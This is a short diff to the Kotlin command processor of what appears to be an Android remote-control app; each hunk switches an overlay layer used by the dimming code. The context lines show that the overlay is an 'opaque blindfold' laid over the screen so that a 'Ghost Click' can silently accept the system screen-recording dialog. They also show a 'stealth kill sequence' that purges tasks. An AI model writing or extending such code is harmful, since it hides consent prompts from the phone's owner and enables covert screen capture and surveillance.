@@ -808,7 +808,7 @@ object CommandProcessor {
                     if (mode == "AUTO") {
                         // Apply the opaque blindfold instantly before the dialog arrives
                         Handler(Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 0, "ACC") // Upgraded to ACC layer to cover System Dialogs
+                            DimmerManager.applyDim(ctx, 0, "AUTO") // Upgraded to AUTO to enable Dual-Layer LCD glow mitigation
                             
                             // FAIL-SAFE: If the Ghost Click fails or hangs, forcefully unblind after 25s
                             Handler(Looper.getMainLooper()).postDelayed({
@@ -2254,7 +2254,7 @@ object CommandProcessor {
                     } else {
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                         android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 0, "ACC")
+                            DimmerManager.applyDim(ctx, 0, "AUTO")
                             service.startStealthKillSequence()
                         }
                         status = "TASK_PURGE_INITIATED"
@@ -3181,7 +3181,7 @@ object CommandProcessor {
         ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
         
         android.os.Handler(android.os.Looper.getMainLooper()).post {
-            DimmerManager.applyDim(ctx, 0, "ACC") // Upgraded to ACC layer to cover System Dialogs
+            DimmerManager.applyDim(ctx, 0, "AUTO") // Upgraded to AUTO to enable Dual-Layer LCD glow mitigation
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                 if (ScreenRecordManager.expectedMode == "AUTO") {
                     DebugLogger.log("SCREEN_REC_FAIL", "Ghost Accept timed out (Safety Fuse). Forcefully removing blindfold.")
